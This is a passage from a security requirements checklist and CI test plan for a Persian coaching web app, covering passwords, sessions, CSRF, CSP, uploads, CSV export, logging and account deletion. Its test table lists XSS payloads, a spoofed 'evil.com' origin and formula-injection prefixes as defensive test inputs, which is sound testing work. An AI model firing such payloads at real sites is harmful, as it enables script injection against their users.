**Required change in `data-model.md` 2-5 (`attachments`) and `api.md` section 14:**
- Linking an attachment only with one atomic `UPDATE`: `SET status='linked', <parent>_id=$1 WHERE id = ANY($ids) AND status='pending' AND uploaded_by=$actor RETURNING id`. If the number of rows does not equal `ids` ← roll back the whole transaction and return `422`.
- The pixel limit, rotation and metadata stripping, and the quota (SEC-U2, SEC-U5, SEC-U7) should be added to the document.
- `GET /attachments/:id` with `Cache-Control: private, no-cache` (not just `private`) so it cannot be seen from the cache on a shared device after logout.

### C5 — Account deletion and data retention
> **Status:** applied in ADR-0010, `data-model.md` (2-1 and section 6), `api.md` section 3, `overview.md` section 5 and ADR-0007 — 28 Mehr 1405 (2026-10-20). The S10 button is removed (ADR-0010 item 6; the sitemap edit is with the ux-designer).

**Required change in `data-model.md` 2-1 (`users.erased_at timestamptz`), `overview.md` section 5 (the "Account deletion" row), `sitemap.md` S10:**
- Account deletion in 0.1 is an **admin CLI command** (`pnpm admin:erase-user --id …`), not an endpoint. The process is described in section 7.
- S10 "Request account deletion" in 0.1, like "Forgot password", only gives guidance: "Message the coach; at most 30 days." Or it creates a question with a fixed subject for the admin. For now there is a button in the UX that has no API.
- The retention table of section 7 should be added to `overview.md`.

### C6 — Bulk import is CSV only
> **Status:** not applied. It must be done before building bulk import and in any case **before deployment**.

**Required change in `api.md` section 13:** in 0.1 only `text/csv` (UTF-8, with or without BOM), at most 1 MB and 500 rows. The coach uses Excel's "Save as CSV UTF-8". If XLSX becomes necessary, a separate ADR (a maintained library, a size limit after unzip).

### C7 — Document consistency
> **Status:** not applied. It must be done **before deployment**; it includes `DEVICE_COOKIE_SECRET` and `TRUSTED_PROXY_HOPS`, which C2 added.

- ADR-0002 section 6 names `SESSION_SECRET` but ADR-0003 does not need it (the session token is random and hashed) and `tech-stack.md` section 5 does not have it either. With C2 this variable should become `DEVICE_COOKIE_SECRET` and be added to the env contract.
- `tech-stack.md` section 4 still mentions `docker compose` for the local environment; the 27 Mehr decision is embedded Postgres (SEC-E1). The security tests of section 6 must run in CI against a real Postgres 16 (Testcontainers or a service container).

### C8 — Database network and backup separation (owner: devops-engineer)
> **Status:** not applied. It must be done **before deployment** (devops-engineer).

**Required change in ADR-0002 sections 6 and 7:** SEC-K2 and SEC-K4.

---

## 5. Security requirements for the 0.1 implementation (checklist)

Owner: **BE** = backend-engineer, **FE** = frontend-engineer, **DO** = devops-engineer. Every item is a "must", except where "recommended" is written.

### 5-1. Password and argon2id (BE)
- [ ] **SEC-P1** Normalize the password before hashing and before comparison, **identically in both places**: `NFKC` ← Persian and Arabic digits to Latin ← `ي`/`ى` (Arabic yeh forms) to `ی` (Persian yeh) and `ك` (Arabic kaf) to `ک` (Persian kaf). No trim and no case change. (Subject to confirmation of C2)
- [ ] **SEC-P2** Length: student 8 to 128 characters; admin and mentor **12** to 128. The UTF-8 byte limit should also be 512. No character-composition rules (NIST SP 800-63B).
- [ ] **SEC-P3** Reject a password if it is in the common or leaked password list (a local file; recommended: 100 thousand passwords instead of 10 thousand, about 1 MB), or if it equals or contains the mobile number (both formats `0912…` and `912…`). The error message is in Persian and non-judgmental.
- [ ] **SEC-P4** argon2id parameters: `memoryCost: 19456` (KiB), `timeCost: 2`, `parallelism: 1`, `outputLen: 32`, a random 16-byte salt (the library default). The output is stored in PHC format (`$argon2id$v=19$m=19456,t=2,p=1$…`) so the parameters travel with the hash. On every successful login, if the hash parameters differ from the current configuration, rehash. Before deployment, measure the hash time on the B1 (target: 50 to 250 milliseconds). If it is under 50, raise `timeCost`, not memory.
- [ ] **SEC-P5** A concurrency queue for hash and verify: at most **2** concurrent argon2 operations per instance. If a request stays in the queue for more than 5 seconds ← `503` with `Retry-After`. The dummy hash (for a non-existent, `invited` or `disabled` user) is built once at application start with the same parameters.

### 5-2. Login and rate limiting (BE)
- [ ] **SEC-R1** Key `login:pi:<phone>:<ip>`: 5 failures in 15 minutes ← 15-minute lockout.
- [ ] **SEC-R2** Key `login:p:<phone>`: 20 failures in 1 hour ← 1-hour lockout, **unless** the request carries a valid device cookie for that same user. The cookie `__Host-uc_dev` = `base64url(userId + '.' + HMAC-SHA256(DEVICE_COOKIE_SECRET, userId))`, with `HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=31536000`, and it is set on every successful login. So an external attacker locks the account, but the account owner can still log in from their own phone.
- [ ] **SEC-R3** Key `login:ip:<ip>` (for IPv6 the `/64` prefix): 30 failures in 15 minutes ← 15-minute lockout. The same key also applies to `POST /auth/tokens/lookup` and `accept` (30 in 15 minutes) and to `change-password` (per `userId`, 5 in 15 minutes).
- [ ] **SEC-R4** The user's IP: only from `X-Forwarded-For`, and the **rightmost** value added by the trusted proxy (`TRUSTED_PROXY_HOPS=1` on App Service). The port is stripped (App Service may send `ip:port`; this was **not confirmed** and must be checked on staging). In the local environment without a proxy, `TRUSTED_PROXY_HOPS=0`. (Added by the 29 Mehr (2026-10-21) review, F-18:) in `NODE_ENV=production` this value must be explicit, otherwise the app must not start, because the value `0` behind a proxy gives all users one IP and turns the IP lockout into a global lockout. The first value of `X-Forwarded-For` or `X-Real-IP` must never be read without this rule. A single function `getClientIp(req)` in `server/http`.
- [ ] **SEC-R5** Counting "failures" in a single transaction with `INSERT … ON CONFLICT DO UPDATE` (atomic, no race between instances). A successful login clears the `pi` key. A password reset via an admin link clears that mobile number's `p` key.
- [ ] **SEC-R6** Lockout and counting for **non-existent** mobile numbers must run exactly the same way so `429` does not reveal whether an account exists. The `429` response has only `code`, `retryAfterSeconds` and a fixed Persian message with the remaining minutes (built from the same `retryAfterSeconds`). It says nothing about the lockout layer or the existence of the account (F-07 correction).
- [ ] **SEC-R7** Normalize the mobile number before building the key (the same `lib/phone` function), so `0912…` and `+98912…` do not create two separate counters.

### 5-3. Invite and reset token (BE, FE)
- [ ] **SEC-T1** (C1) The token only in the link fragment and in the POST body. No route may have `:token`. The `/invite` and `/reset` pages must clear the hash with `history.replaceState` after reading it.
- [ ] **SEC-T2** 32 bytes from `crypto.randomBytes`; store the SHA-256; look up by `token_hash`; acceptance in **one transaction** with `UPDATE auth_tokens SET used_at=now() WHERE token_hash=$1 AND used_at IS NULL AND revoked_at IS NULL AND expires_at > now() RETURNING …` (this prevents concurrent double consumption).
- [ ] **SEC-T3** No GET may consume or invalidate the token. The `/invite` and `/reset` pages: `Cache-Control: no-store`, `Referrer-Policy: no-referrer`, `<meta name="robots" content="noindex">`, no Open Graph tags with a name or mobile number, and no external links.
- [ ] **SEC-T4** Acceptance requires the full mobile number (C1). 5 wrong mobile numbers for one token ← `revoked_at = now()` and `audit_log(auth.token_revoked_mismatch)`.
- [ ] **SEC-T5** After acceptance: all of the user's previous sessions are revoked, `password_changed_at = now()`, and staff see "Invite accepted: time, device type" in the profile and the users page, so that if a student says "the link didn't work" the coach can tell someone else opened it. If the browser already has another session when the link is opened (for example the coach tries the link themselves), the page should warn, and acceptance should close that browser's previous session.
- [ ] **SEC-T6** The admin bootstrap CLI link: expiry of **1 hour**. It is printed only on the stdout of that CLI process, not in the application log.
- [ ] **SEC-T7** A recovery CLI for the sole admin: `pnpm admin:reset-link --phone …`, run from the server console (SSH into the container), creates a 1-hour reset link, clears that mobile number's lockouts and is recorded in `audit_log` with `actor_id = null` and `data.via = 'cli'`.
- [ ] **SEC-T8** Expiry: invite 7 days (F1), reset 24 hours. Creating a new token invalidates the earlier open tokens (by design). `inviteUrl` and `resetUrl` in a response carry `Cache-Control: no-store` and never appear in `audit_log.data`.

### 5-4. Session and cookie (BE)
- [ ] **SEC-S1** The session cookie in production: `__Host-uc_session=<token>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=<seconds up to the session's absolute cap>`. No `Domain`. (F-07 correction:) `Max-Age` equals the **absolute cap**, because RSC cannot write a cookie. The sliding expiry is checked **only on the server** (`sessions.expires_at`) on every API and RSC request and renewed at most every 15 minutes. A stale cookie grants no access. Condition: no path may accept a session without the same SEC-S3 check.
- [ ] **SEC-S2** Lifetime: student sliding 30 days and absolute cap 90 days; **admin and mentor sliding 7 days and absolute cap 30 days** (C2).
- [ ] **SEC-S3** Validation on **every** request (API and RSC): the session is not revoked or expired; `users.status = 'active'`; `sessions.created_at >= users.password_changed_at`; the **role is read from `users`**, not from a session cache.
- [ ] **SEC-S4** A fresh session on login and token acceptance. With `change-password`, the other sessions are revoked **and the current session is also rotated** (a new token, a new row). All sessions are revoked on: password change or reset, deactivation, role change, mobile change by the admin, and account deletion.
- [ ] **SEC-S5** Logout: `POST /auth/logout` ← `revoked_at`, the cookie with `Max-Age=0`, and the header `Clear-Site-Data: "cache"`.
- [ ] **SEC-S6** The session token is read only from the cookie (not the query string and not any other header).
- [ ] **SEC-S7** (Recommended for 0.1, required before inviting a second admin) Password re-confirmation for the CSV export, inviting an admin or mentor, changing a role, and `settings.access`: if more than 30 minutes have passed since the last login or confirmation, `POST /auth/reauth { password }` is required (column `sessions.reauth_at`).
- [ ] **SEC-S8** Local environment: if `APP_BASE_URL` starts with `http://localhost`, the cookie name is `uc_session` without `Secure`. In `NODE_ENV=production`, if `APP_BASE_URL` does not start with `https://`, the application must **not start**.

### 5-5. CSRF (BE)
- [ ] **SEC-C1** For all `POST`, `PUT`, `PATCH` and `DELETE` methods under `/api/v1` (including `/auth/login` and `/auth/tokens/*`): `Origin` **must be present** and exactly equal to `new URL(APP_BASE_URL).origin`. A missing `Origin` ← `403 BAD_ORIGIN`. A full string comparison, not `includes` or `startsWith`.
- [ ] **SEC-C2** (Second layer) If `Sec-Fetch-Site` is present and its value is not `same-origin` ← `403`.
- [ ] **SEC-C3** `Content-Type`: only `application/json` (with an optional charset). `multipart/form-data` only on `/attachments` and `/imports/students`. Anything else ← `415`. (F-07 correction:) A **bodyless** POST (no positive `Content-Length` and no `Transfer-Encoding`) may have no `Content-Type`. Any non-empty body without a `Content-Type` ← `415`, and a bodyless path rejects any body other than empty or `{}`. The main defense is SEC-C1.
- [ ] **SEC-C4** No GET may have a side effect (writing `last_seen_at` and the export `audit_log` are exceptions).
- [ ] **SEC-C5** There must be no `Access-Control-Allow-*` header in any response. If a mobile app or a bot ever comes along, it gets a separate token and a separate ADR.

### 5-6. Security headers and CSP (BE/FE, in `middleware.ts` or `next.config`)
- [ ] **SEC-H1** A CSP with a per-request nonce (Next.js middleware builds the nonce and Next itself puts it on its scripts). All pages are dynamic (staff and students are both authenticated). The production value:
  ```
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  font-src 'self';
  connect-src 'self';
  worker-src 'self';
  manifest-src 'self';
  frame-src 'none';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests
  ```
  - **No external resources** (no CDN, no font, no analytics). `style-src 'unsafe-inline'` is only because of Radix's style attributes. Its risk is low because React escapes text.
  - In the development environment, only `'unsafe-eval'` is added to `script-src` and `ws:` to `connect-src` (for HMR).
  - The `GET /attachments/:id` response has its own CSP: `default-src 'none'; img-src 'self'; sandbox`.
- [ ] **SEC-H2** On all responses:
  | Header | Value |
  |---|---|
  | `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` (without `preload` until the domain is final; E4) |
  | `X-Content-Type-Options` | `nosniff` |
  | `Referrer-Policy` | `same-origin` (on `/invite` and `/reset` the value is `no-referrer`) |
  | `X-Frame-Options` | `DENY` |
  | `Cross-Origin-Opener-Policy` | `same-origin` |
  | `Cross-Origin-Resource-Policy` | `same-origin` |
  | `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=(), browsing-topics=()` (picking a photo from the camera with `<input type=file>` does not need these permissions) |
  | `X-Powered-By` | removed (`poweredByHeader: false`) |
- [ ] **SEC-H3** Cache: `/api/v1/**` responses and authenticated HTML pages carry `Cache-Control: private, no-store`. `/_next/static` assets and fonts carry `public, max-age=31536000, immutable`.
- [ ] **SEC-H4** The service worker (PWA) caches **only** `/_next/static/*`, fonts and icons. It must never cache HTML, `/api/` or `/attachments/` (e2e test).
- [ ] **SEC-H5** `next.config`: `images.remotePatterns` empty (no image optimization from another domain). In production, no stack trace reaches the user.

### 5-7. Access control (BE)
- [ ] **SEC-A1** Every public service has `actor` as its first parameter. Every single-resource read goes through the helper `loadInScope(actor, kind, id)`, which finds `student_id` from the parent (up to the root) and returns `404` when out of scope.
- [ ] **SEC-A2** Staff list queries have the `staffStudentScope(actor)` condition **in SQL**, not a filter after reading.
- [ ] **SEC-A3** (C3) The referenced-ID table, in the service and inside the same transaction.
- [ ] **SEC-A4** (C3) `invite-link` by a mentor only for `role='student'`. Role changes only by the admin. Removing the last admin returns `409` (by design).
- [ ] **SEC-A5** Shared paths (`/tasks/:id`, `/questions/:id`, `/profiles/:id`, `/attachments/:id`, `/tasks/:id/submissions`) must choose the DTO with a `switch` on `actor.role` whose default case is an **error**, not the staff DTO.
- [ ] **SEC-A6** (C3) Editing and deleting a note and a review: author **and** in scope, or admin.
- [ ] **SEC-A7** All zod input schemas use `.strict()`. Fields forbidden for each role (`primaryMentorId`, `currentStageId`, `lifecycleStatus`, `status` in a student's milestone, `studentId` on `/me` paths) must not be in the schema so that they return `422`.
- [ ] **SEC-A8** (C3) `summary` for an assignee only with an open question.
- [ ] **SEC-A9** Repos must select columns **explicitly**. `password_hash` is read only in `identity.repo.getCredentialsByPhone`. RSCs pass only DTOs (not database rows) to client components.
- [ ] **SEC-A10** Server Actions are forbidden (search for `"use server"` in CI and reject). All mutations are Route Handlers and are registered in `routes.manifest.ts`.
- [ ] **SEC-A11** `middleware.ts` is only for the nonce, headers and redirecting to the login page, and is **never the only barrier to access**. Next.js must always be on the latest patched version.

### 5-8. Input validation and XSS (BE, FE)
- [ ] **SEC-V1** JSON body limit: 256 KB, **before** parsing (check `Content-Length` and cut the stream after the limit) ← `413`. Length limits in zod: name 100, subject 200, note, message and feedback 10 thousand, job post, proposal and profile text 20 thousand characters each, `links` at most 10 items, `tags` at most 20 items, `q` at most 100, `limit` at most 100.
- [ ] **SEC-X1** `dangerouslySetInnerHTML` is forbidden (Biome `noDangerouslySetInnerHtml` at error level). New lines with CSS `white-space: pre-wrap`. Search highlighting by splitting the string into several `<mark>` elements, not HTML.
- [ ] **SEC-X2** **All** URL fields (`public_url`, `links[].url` in submissions, questions and messages, stage `content_links`, `evidence` if it has a link) are checked on the server with `new URL()`: `protocol === 'https:'`, no `username` and `password`, at most 2048 characters. A shared `httpsUrl` schema in `server/http`.
- [ ] **SEC-X3** If the UI makes links inside free text automatically clickable, it must link only `https://` and `http://` and build the output with a React component, not HTML.
- [ ] **SEC-X4** Data must never be placed in a `<script>` with a hand-written `JSON.stringify`. Only props to components.
- [ ] **SEC-X5** In normalization (`lib/text-fa`), the directional control characters `U+202A` to `U+202E` and `U+2066` to `U+2069` are removed from names, subjects, link titles and `original_name`. The half-space (`U+200C`) and `U+200D` stay.
- [ ] **SEC-X6** External links: `target="_blank" rel="noopener noreferrer"`. Show the link in `<bdi dir="ltr">` with the destination **domain** next to the link text (for links given by the student).

### 5-9. Upload (BE)
- [ ] **SEC-U1** The file type is detected from the **content** (`sharp(buf).metadata().format` ∈ `jpeg|png|webp`), not from `Content-Type` or the extension. SVG, GIF, HEIC and PDF are rejected in 0.1 (`415`).
- [ ] **SEC-U2** `sharp(input, { limitInputPixels: 40_000_000, failOn: 'error', animated: false })`. The output is at most 4096 pixels on the longest side (`resize({ fit: 'inside', withoutEnlargement: true })`).
- [ ] **SEC-U3** Image processing concurrency of at most 2 (`sharp.concurrency(1)` and a simple queue).
- [ ] **SEC-U4** The 5 MB limit **before** the body is buffered: `Content-Length` over `MAX_UPLOAD_BYTES + 64KB` ← immediate `413`. The body stream is read with a byte counter and cut after the limit. `request.formData()` must not be called on an unlimited body.
- [ ] **SEC-U5** Order: `.rotate()` (apply the EXIF orientation) ← re-encode to the same format ← **without** `withMetadata()` (EXIF, GPS, ICC and XMP are removed). The original file is never stored.
- [ ] **SEC-U6** Download from `GET /attachments/:id`: `Content-Type` from the re-encoded format (not from the input), `X-Content-Type-Options: nosniff`, `Content-Disposition: inline; filename*=UTF-8''<sanitized name>`, a separate CSP (SEC-H1), `Cache-Control: private, no-store` (F-07 correction; stricter than the `no-cache` in C4).
- [ ] **SEC-U7** Quota: at most 20 `pending` attachments and 100 uploads per day per user ← `429`.
- [ ] **SEC-U8** `storage_key` = a random UUID. `original_name` is only for display and is sanitized (no path, no control characters, at most 200 characters).
- [ ] **SEC-U9** (C4) Atomic linking of only a `pending` attachment from the same uploader.

### 5-10. CSV (BE)
- [ ] **SEC-V2** Neutralizing output cells: if a string value, after trim, starts with one of `=`, `+`, `-`, `@`, Tab (`\t`), CR (`\r`), or the full-width versions `＝ ＋ － ＠`, a `'` is prepended. Then standard CSV quoting (all cells inside `"` and inner `"` doubled). The mobile number is written in the output in the `0912…` format (not starting with `+`). A single `toSafeCsvCell` function with a unit test.
- [ ] **SEC-V3** The export columns are **explicit and minimal**. Internal notes, flags, health reasons and submission text do not appear in the CSV. The output: `Content-Disposition: attachment`, `Cache-Control: no-store`, and `audit_log(export.*)` with the row count. Before the download, the UI shows a warning: "This file contains the mobile numbers and profile links of all students; delete it after use" (Persian original: «این فایل شامل موبایل و لینک پروفایل همه‌ی هنرجوهاست؛ پس از استفاده پاکش کن»).
- [ ] **SEC-V4** (C6) Import: CSV only, at most 1 MB and 500 rows. Each cell goes through the same zod as the normal paths. Formula-like inputs are stored as text and are neutralized on output with SEC-V2.
- [ ] **SEC-V5** The import response (with `inviteUrl`s) carries `Cache-Control: no-store` and is never logged. Row errors give the line number and column name, **not the value** (especially the mobile number).

### 5-11. Logs and masking (BE, DO)
- [ ] **SEC-L1** pino `redact` (with `censor: '[REDACTED]'`):
  `req.headers.cookie`, `req.headers.authorization`, `req.headers["x-job-secret"]`, `res.headers["set-cookie"]`, `*.password`, `*.currentPassword`, `*.newPassword`, `*.token`, `*.inviteUrl`, `*.resetUrl`, `*.passwordHash`, `*.tokenHash`.
- [ ] **SEC-L2** The request serializer logs only `method`, the **path without the query string**, `statusCode`, `responseTime`, `requestId` and `userId` (if present). Request and response bodies are never logged.
- [ ] **SEC-L3** A mobile number is never logged in full. Log `userId` for correlation. If the mobile number is needed (for example a failed login for a non-existent mobile number), use `maskPhone('+989121234567') → '+98•••••4567'`. This function has a unit test in `lib/phone`. The CI test (section 6, T-LOG) searches the log output with the pattern `(\+98|0098|0)9\d{9}`.
- [ ] **SEC-L4** zod errors in logs have only `path` and `code`, not `received` or the input value. Drizzle query logging is off in production.
- [ ] **SEC-L5** (DO) Postgres: `log_statement = 'ddl'`; if slow-query logging is on, `log_parameter_max_length = 0` and `log_parameter_max_length_on_error = 0`. App Service's own HTTP log is either off or retained for at most 7 days. The application log is retained for at most 30 days.
- [ ] **SEC-L6** (DO) Alerts: more than 50 failed logins in 15 minutes across the whole system; any lockout on the admin account; any `user.role_changed`. (From the structured log, with a fixed `event`: `auth.login_failed`, `auth.locked`, …)
- [ ] **SEC-L7** `audit_log` also records these events: `user.invite_link_created` (with the creator's role), `auth.token_revoked_mismatch`, `auth.locked` (only for existing accounts), `note.visibility_changed` (internal ← shared), `user.phone_changed`, `user.erased`, `session.revoked_all`. A token, link or password must never appear in `data`.

### 5-12. Internal jobs endpoint (BE)
- [ ] **SEC-J1** If `JOBS_MODE=http-trigger` and `JOB_TRIGGER_SECRET` is shorter than 32 bytes (or empty), the application must **not start**. In every other case, `/api/internal/**` returns `404` regardless of the header.
- [ ] **SEC-J2** Constant-time comparison: `timingSafeEqual(sha256(header), sha256(secret))` (hash both to equal length). A mismatch ← `404` (not `401`) and a warning log.
- [ ] **SEC-J3** `:name` from a whitelist (`health.sweep`, `auth.cleanup`, `files.cleanup`). The body is ignored. Rate limit of 60 per hour. This path is exempt from the session and `Origin` check, but **only** this exact prefix.
- [ ] **SEC-J4** `/healthz` returns only `{ ok, db: 'ok'|'fail', lastHealthSweepAt, version }`. It must not return any error message or connection string.

### 5-13. Secrets and configuration (DO, BE)
- [ ] **SEC-K1** The 0.1 secrets list: `DATABASE_URL`, the storage credential, `DEVICE_COOKIE_SECRET` (32 random bytes), `JOB_TRIGGER_SECRET` (only if http-trigger), the `age` public key (not a secret but fixed). All in App Settings and GitHub Secrets; **none in the repository, the image or the build log**. `.env*` is in `.gitignore`, except `.env.example` without values. Secret scanning (gitleaks) in CI.
- [ ] **SEC-K2** (C8) Database: **"Allow public access from any Azure service" off**. Either VNet integration and private access (if the B1 plan supports it and the private DNS cost is acceptable), or a firewall rule only for App Service's outbound IPs (`possibleOutboundIpAddresses`). Connect with `sslmode=verify-full`. The application's database role must not be a superuser. Recommended: a separate role for migrations (DDL) and a runtime role with DML only, and the runtime role has only `INSERT` and `SELECT` on `audit_log`.
- [ ] **SEC-K3** Blob: container with `public access = none`. The application's credential has access only to the attachments container (a Managed Identity with the `Storage Blob Data Contributor` role on that container, or a container-scoped SAS). The full storage account key must not be in the app settings.
- [ ] **SEC-K4** (C8) Backups in a **separate storage account** with an immutability policy or 14-day soft delete. The application has no credential for it. The destination inside Iran has only a **read-only** SAS with an expiry of at most 90 days, and its rotation is in the runbook.
- [ ] **SEC-K5** The `age` **private** key is outside Azure and GitHub (with the founder, with an offline copy). Without it the backup cannot be restored. So a second place to keep the key must be specified in the runbook.
- [ ] **SEC-K6** App Service: "HTTPS Only" on, minimum TLS 1.2, FTP and SCM basic auth off, remote debugging off. Deploy from GitHub Actions with OIDC (federated credential), not a publish profile. Private GHCR.
- [ ] **SEC-K7** Rotation: any secret immediately upon a leak, and `DEVICE_COOKIE_SECRET` and the database password once a year. Rotating `DEVICE_COOKIE_SECRET` only invalidates the device cookies (its effect is that the global mobile lockout applies to everyone once).

### 5-14. Dependencies (DO, BE)
- [ ] **SEC-D1** Dependabot or Renovate weekly; security updates for Next.js, React, sharp and `@node-rs/argon2` within 72 hours.
- [ ] **SEC-D2** `pnpm audit --prod --audit-level=high` in CI **blocks merge**. Exceptions only with a dated note in a designated file.
- [ ] **SEC-D3** `pnpm install --frozen-lockfile`. Install scripts only for the listed packages (`onlyBuiltDependencies` in pnpm).
- [ ] **SEC-D4** A small base image (for example `node:24-slim` or distroless), a non-root user, image scanning (Trivy) in CI that fails on critical.

### 5-15. Local development environment (everyone)
- [ ] **SEC-E1** The embedded Postgres listens only on `127.0.0.1`, with a separate dev password that is not used in any other environment.
- [ ] **SEC-E2** **Production data never comes to the development machine.** Seeds and fixtures are fake (mobile numbers `+98900000xxxx`). If real data is needed for debugging, only after anonymization with the same deletion process (section 7).
- [ ] **SEC-E3** Production seeds have no default user or password. The first admin only via the CLI (SEC-T6).

### 5-16. User interface (FE)
- [ ] **SEC-F1** Login form: `autocomplete="username"` for the mobile number (`inputmode="tel"`) and `current-password`; the set-password form uses `new-password` so the browser's password manager works.
- [ ] **SEC-F2** The login error message is always the same: "Mobile or password is incorrect" (Persian original: «موبایل یا رمز درست نیست»). Lockout message: "Too many attempts; try again in X minutes" (Persian original: «تلاش‌ها زیاد بود؛ X دقیقه‌ی دیگر دوباره امتحان کن»).
- [ ] **SEC-F3** A "My devices" page with "Sign out of all other devices".
- [ ] **SEC-F4** The invite acceptance page has one line about where data is kept (section 8) and a link to a short privacy page.
- [ ] **SEC-F5** Logout: after the response, `location.replace('/login')` so the back button does not show the previous page.
- [ ] **SEC-F6** A "the student sees this" label next to `platform_profiles.notes`, the task description, feedback and the shared note. Changing a note from internal to shared has a confirmation dialog.
- [ ] **SEC-F7** Next to the contract evidence upload: "Cover the client's name and photo and the contract ID."
- [ ] **SEC-F8** Platform profile fields must carry the warning "Do not write your account's login password or email here" (PRD section 6).

---

## 6. Security tests that must be in CI (merge blockers)

All run on a real Postgres 16 (Testcontainers or a service container in GitHub Actions). Locally on the embedded Postgres.

| Code | Test | Details |
|---|---|---|
| **T-MATRIX** | Access matrix | All endpoints in `routes.manifest.ts` × roles: **A**, **M-owner**, **M-non-owner**, **former-M** (after a mentor change), **M-assignee** (responsible for a question outside their scope), **S-owner**, **S-other**, **no session**, **deactivated user with an old cookie**, **`invited` user**. The expected status code is in the manifest. An unregistered endpoint ← failure. For single resources, another student's resource ID and a non-existent ID must both give the **same** response (`404` with the same body) |
| **T-REF** | Referenced IDs (C3) | One negative case for every row of the C3 table: another student's `profileId`, another student's `taskId`, `attachmentIds` of another user or already `linked`, `mentorId`/`reviewerId`/`assigneeId` = a student's ID, bulk `studentIds` with one out-of-scope member (the whole request is rejected and **nothing** is created) |
| **T-ESC** | Privilege escalation | A mentor asks for an invite link for an `invited` user with the `admin` and `mentor` roles ← `404`. A mentor `PATCH /users/:id/role` ← `403`. A student `PATCH /me/student {primaryMentorId}` ← `422`. A student `POST /me/milestones {status:'approved'}` ← `422` |
| **T-CANARY** | Canary (extension of ADR-0004) | In addition to `CANARY-…` in the internal note, flag and health reason: the strings `$argon2id$`, the session token hash, the mentor's mobile number, and `reviewerId` must not be in **any** student GET response or any student page HTML (including the RSC payload) |
| **T-DTO** | Strict DTO | Every response of student-accessible paths is parsed with the zod `.strict()` schema of that DTO. An extra field ← failure |
| **T-AUTH** | Authentication | Lockout exactly after 5 failures (`pi`); the `p` lockout after 20 failures, and passing with a valid device cookie; identical `429` for a non-existent mobile number; the dummy hash is called for a non-existent user (a spy, not timing); a forged `X-Forwarded-For` on the left does not bypass the IP lockout |
| **T-TOKEN** | Token | Single use (two concurrent acceptances ← only one succeeds); expired ← `410`; re-creation invalidates the previous one; a wrong mobile number 5 times ← token invalidated; no path with `:token` in the manifest |
| **T-SESSION** | Session | Cookie attributes (`HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`, no `Domain`); revocation after password change, reset, deactivation, role change and mobile change; rotation of the current session after a password change; the absolute cap (with a fake clock); the shorter staff lifetime |
| **T-CSRF** | CSRF | For **all** non-GET endpoints in the manifest: no `Origin` ← `403`; another `Origin` (including `https://app.example.ir.evil.com` and `http://` on the same domain) ← `403`; `Content-Type: text/plain` ← `415` |
| **T-HDR** | Headers | CSP (no external resource; a string test that `https:` must not be in `script-src`/`connect-src`/`font-src`), HSTS, `nosniff`, `Referrer-Policy`, `frame-ancestors`, no `X-Powered-By`; on one HTML page, one API response and one attachment |
| **T-CSP-E2E** | Playwright | In all e2e scenarios, a `securitypolicyviolation` event and a request to a domain other than `APP_BASE_URL` ← failure. The service worker cache holds only `/_next/static` |
| **T-XSS** | Playwright | Payloads `<img src=x onerror=…>`, `"><svg onload=…>`, `</script>` and a `javascript:` link in all the student's free-text fields (section 3-5); the mentor opens the profile, task, question and "Today" pages; no `dialog` may open. The API returns `422` for `javascript:` and `data:` links |
| **T-UPLOAD** | Upload | HTML with `Content-Type: image/png` ← `415`; SVG ← `415`; 6 MB ← `413` without full buffering; a PNG with dimensions over 40 megapixels ← `422`; a JPEG with GPS ← output without EXIF; linking another user's attachment ← `422` |
| **T-CSV** | CSV | Output neutralizes cells starting with `= + - @ \t \r ＝` with `'`; the internal-note column is not in the output; XLSX import ← `415` (C6) |
| **T-LOG** | Log | The logs of a complete flow (invite ← acceptance ← failed login ← login ← search by mobile number ← upload ← CSV export) are collected and must not contain a full mobile number pattern, an invite token, a cookie value, `$argon2id$` or `X-Job-Secret` |
| **T-JOBS** | Internal endpoint | With `JOBS_MODE=in-process` ← `404` even with the correct secret; with `http-trigger` and a wrong secret ← `404`; application start with a short secret ← error; a name outside the list ← `404` |
| **T-STATIC** | Static checks | Biome: `noDangerouslySetInnerHtml` and `noRestrictedImports` (the `health` and `notes.internal` modules in `app/(student)` and `api/v1/me`); search for `"use server"`; gitleaks; `pnpm audit`; Trivy on the image |

---

## 7. Sensitive data: retention and account deletion

### 7-1. Retention policy (proposal; awaiting founder approval)
| Data | Retention period | Mechanism |
|---|---|---|
| `sessions` (with IP and User-Agent) | Until expiry or revocation + 7 days | `auth.cleanup` (existing) |
| `auth_tokens` | Until expiry or use + 7 days | `auth.cleanup` (existing) |
| `auth_throttle` | Until the end of the window or lockout | `auth.cleanup` (existing) |
| `pending` attachment | 24 hours | `files.cleanup` (existing) |
| Application log | 30 days | Host setting (DO) |
| Host HTTP log | Off or 7 days | Host setting (DO) |
| `audit_log` | 24 months; the `ip` column becomes `null` after 90 days | New monthly job `audit.cleanup` |
| Daily backup | 14 days daily + 8 weeks weekly (both destinations) | DO, ADR-0002 section 6 |
| Data of a `graduated` or `dropped` student | As long as the training relationship exists; after 24 months of inactivity, the admin reviews it for deletion | A list in the admin settings (1.0) or a manual query in 0.1 |
| `submissions` with `ai_use_consent = true` | Until consent is withdrawn or the account is deleted | 1.0 must provide "withdraw consent" before any use |
| Exported CSV files | Outside the system; the admin's responsibility | Warning SEC-V3 |

### 7-2. Account deletion in 0.1 (C5)
**Request:** the user messages the coach (S10 gives the guidance). The admin carries it out within 30 days at most.
**Execution:** `pnpm admin:erase-user --id <uuid> --confirm "<displayName>"` (a CLI, not an endpoint, so that a destructive action is not available over the web), in one transaction:

| Table | Action |
|---|---|
| `users` | `display_name = 'کاربر حذف‌شده'` ("Deleted user"), `phone = 'erased:' + id` (stays unique), `password_hash = null`, `status = 'disabled'`, `erased_at = now()` |
| `sessions`, `auth_tokens`, `auth_throttle` (that mobile number's keys) | Delete |
| `students` | Personal fields (`messenger_handle`, `primary_skill`, `goal_90d`, `self_reported_blocker`, `niche_statement`, `income_goal_usd`, `tags`, `cohort`, `status_reason`) ← `null` or empty; rebuild `search_text`; `lifecycle_status = 'dropped'` |
| `platform_profiles`, `profile_snapshots` | **Delete completely** (the profile link is Class 3) |
| `submissions` | `body_text`, `links`, `job_post_text`, `proposal_text`, `profile_text` ← `null`; `ai_use_consent = false` |
